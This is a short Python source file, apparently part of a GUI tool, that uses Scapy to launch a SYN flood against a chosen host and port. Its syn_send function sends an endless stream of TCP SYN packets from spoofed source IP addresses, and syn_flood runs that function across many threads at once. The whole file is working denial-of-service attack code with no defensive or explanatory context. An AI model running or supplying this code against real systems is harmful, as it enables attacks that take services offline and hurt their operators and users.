from time import sleep

from scapy.all import *
from scapy.layers.inet import IP, TCP

import main

flag = 1


def syn_send(dst, dport):
    global flag
    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    while True:
        if flag == 1:
            sport = random.randint(1024, 65535)
            index = random.randrange(4)
            ipLayer = IP(src=srcList[index], dst=dst)
            tcpLayer = TCP(sport=sport, dport=dport, flags="S")
            send(ipLayer / tcpLayer)
        else:
            sleep(3)
            flag = 1
            return 0


def syn_flood(dst, dport, ts):
    main.MainWindows.result = (IP(src='10.1.1.1', dst=dst) / TCP(sport=65535, dport=dport, flags="S")).show()
    threads = []
    for i in range(ts):
        threads.append(threading.Thread(target=syn_send, args=(dst, dport)))

    for th in threads:
        th.start()
